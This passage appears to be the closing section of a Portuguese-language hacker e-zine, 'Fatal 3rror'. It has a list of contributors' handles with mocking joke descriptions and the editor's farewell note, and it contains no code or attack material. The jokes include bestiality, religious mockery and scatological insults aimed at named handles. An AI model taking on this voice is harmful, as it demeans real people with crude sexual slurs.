+pcmcia            Procurado por rebeldes pakistaos por urinar no sepulcro de Cristo.
+RoadHouse         Procurado por fazendeiro peruano por estuprar uma egua.
+Slash_DOMI        Fazendeiro que procura um tarado estuprador de eguas.
+Source            Viciado em Chaves e novelas mexicanas do SBT.
+s0laris           Colecionador de borboletas com medo de larvas.
+Spike             Costuma lamber as proprias bolas.
+Thasmx            Punk com planos de congelar a terra.
+Tinkertrain       Gordinho que disputou uma cocha de frango com a Helaine
+                  do "no limite" (e perdeu).
+TPGA              "Sera que os Herculoides vencem os Thunder Cats?"
+
+   E chegamos ao fim de mais uma edicao da sua, da minha, da nossa Fatal
+3rror. Espero que todos voces que leram tenham curtido.
+   Antes de acabar soh quero avisar que eu tive que me esforcar para lancar
+a zine dentro do prazo (2-3 meses), mas agora e' serio... Tipo... Os estudos
+estao pesando sobre mim e a partir de agora soh vai piorar as coisas. Mas
+sem stress... A zine continua, soh nao tem previssoes para a proxima edicao.
+   Se voce imprimir esta edicao da zine, apos le-la nao jogue-a fora. Use-a
+para limpar a bunda.
+
+   Falow!!!
+
+_EoF_
